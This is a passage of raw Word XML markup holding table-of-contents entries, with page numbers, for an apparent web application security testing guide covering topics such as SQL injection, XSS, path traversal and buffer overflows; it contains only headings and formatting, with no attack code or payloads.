              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0682910F" w14:textId="31ECC059" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104346" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.5</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test the Session Management Mechanism</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104346 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5A03907D" w14:textId="3D648F08" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104347" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.6</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test Access Controls</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104347 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="55CB01C8" w14:textId="4BA1692E" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104348" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.6.1</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Understand the Access Control Requirements</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104348 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="68103EB4" w14:textId="5CB48E42" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104349" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.7</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test for Input Based Vulnerabilities</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104349 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>18</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5242728E" w14:textId="7A8FAA6A" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104350" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.7.1</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test for Path Traversal</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104350 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>18</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5A319264" w14:textId="28797916" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104351" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.7.2</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test for SQL Injection</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104351 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3AC9FA3E" w14:textId="2AF80148" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104352" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.7.3</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test for XSS</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104352 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>21</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7191F649" w14:textId="5D138688" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104353" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.7.4</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test for HTTP Header injection</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104353 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="07A23F97" w14:textId="56A39820" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104354" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.7.5</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test for Open Redirection</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104354 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="766E3B13" w14:textId="5C3D124A" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104355" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.8</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test for Function-Specific Input Vulnerabilities</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104355 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7DDD4315" w14:textId="7E59C263" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104356" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.8.1</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test for Buffer Overflows</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104356 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2C636E26" w14:textId="57CC5E83" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104357" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.8.2</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test for Format String Vulnerabilities</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
